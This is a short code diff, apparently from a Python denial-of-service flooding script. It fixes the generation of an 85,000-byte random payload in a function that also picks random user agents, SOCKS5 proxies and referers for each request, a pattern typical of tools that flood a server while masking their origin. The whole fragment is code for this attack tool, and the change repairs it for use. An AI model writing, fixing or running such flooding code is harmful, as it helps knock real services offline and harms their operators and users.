@@ -199,7 +199,7 @@ def join():
              print('[+] server error')
 def join2():
   global useragents, ref, socks5
-  data = hh._urandom(85000)
+  data = random._urandom(85000)
   data2 = int(0)
   userbig = "UserAgents: "+random.choice(useragents)+random.choice(socks5)+"\r\n"
   reflol = random.choice(ref)+"\r\n"
